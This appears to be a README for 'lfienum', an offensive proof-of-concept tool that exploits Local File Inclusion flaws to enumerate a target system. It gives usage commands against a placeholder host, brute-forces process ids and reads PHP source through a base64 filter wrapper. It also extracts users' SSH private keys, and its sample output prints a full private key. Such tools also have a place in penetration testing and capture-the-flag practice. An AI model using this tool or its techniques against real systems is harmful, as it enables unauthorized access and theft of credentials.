Local File Inclusion Enumeration (PoC)  

Almost whole system enumeration when target is vulnerable to LFI.  

```
lfiǝnum ~by 0bfxgh0st*

Usage python3 lfienum <url> <option>

Options:

       --pid          Bruteforce 999 process id
       --wrapper      (php://filter/convert.base64-encode/resource=)

Examples:
           python3 lfienum "http://ghost.server/index.php?page="
           python3 lfienum "http://ghost.server/index.php?page=" --pid
           python3 lfienum "http://ghost.server/index.php?page=" --wrapper index.php
```

Auto id_rsa key extraction from /etc/passwd, check `def ID_RSA():` function  
Output example:  
```
...

[SSH ID_RSA KEY]
ghost key from http://ghost.server/index.php?file=/home/ghost/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDRScoSFO
Tk3d1A0K1kYCQzAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQC5SLRm3gjC
mXU6nHisg7VT0UxRTuoyL9IkiV9xPjdx44fTujyqsmjS+VjKyhGiTw+UB3jDZr81jCv4DO
WiwRc+A7PxnBA0qP1UU9OxuVaSgetSHCbjTNU4UlCPDBo2iZV2gw17CzuwGqa3Yz/UWoUV
KxKU+vMwO+evzUkL3w1LoAWKvWG0VfAdRh4rqXKsNDHoTdWBWLvLCx7PkBH8fF6+OIM+Lq
NM1tVQYuSHpAoNbj5bnGwLEt4Z8GqyZELdaNt8lc7XdO8YbAmPN/boyEZd9KRO/FdeuayE
yRQygxpz25goYGuj+Gdg3uQFEScDtYyUKwpsUsNDv1q0KOLWntT+5I8bHwME6ozqBBRba9
5K7kbCxLLwHxvN7E+dMFxH2e1J3uax1d/h5D1JNrJpi0KsFeycPL6Hr2StfNORRhdXEKGd
HudCjvhjRx27rAEwVBj/gcTS5Esu5sd0R5ToXb1ukT/lFhXjsW3qHYHexjbZQ7kSJPxJrg
KhOPkQ0YeBYzJzS9ffFjIZdTUBcLuE518rNKnKezPl7H9TNNnuHRgL/XycbrfUVWQVS+yo
aW6jjhykuO43zeiTNe/tyJUkBlJu5vs4xM1aDMSQW6fn2iVDrRbxY0lzq11fT59RbIQXzv
fL9B4SSMC6ccKVJlyYNLTZVpPyOonFvy6hThflpkhA/mGVgMvDyiwxLx/5+odvRRD7Gg0w
vyRsUY5/8RfNIZelJ731cwccRbbNfUmUbOcSG0yPMrBdGUldSwiqI9XyswM/goLzIKPC/7
UKQmKZ8oy7B5utVOW5aWqZCFe+shV8qPvaS/4bUaykQMdcFclbD22Pinwx6X6DHnGcmRtF
m+1QuC+jT23hAtJbqsafYQ61sUxkAQUExKdBQ+l7l6a0OZhG+L28P7xuQ7wwhhX6PpeKmD
HO1fvy1tu3wuQ9MAHGqMP+W2CJMVt3W4SvMasLIklPWDjy5iaii4WJkijIHopldyyL7wJ7
QRcxfhQ+4r+6virvZEo/2CkWtIhi8IcyPx6bQA54iu9eKkZE1gOdyDJogIrvkv+787rAlL
skyX2Q==
-----END OPENSSH PRIVATE KEY-----
```
Internal wordlist from sources:  
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt  
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt  
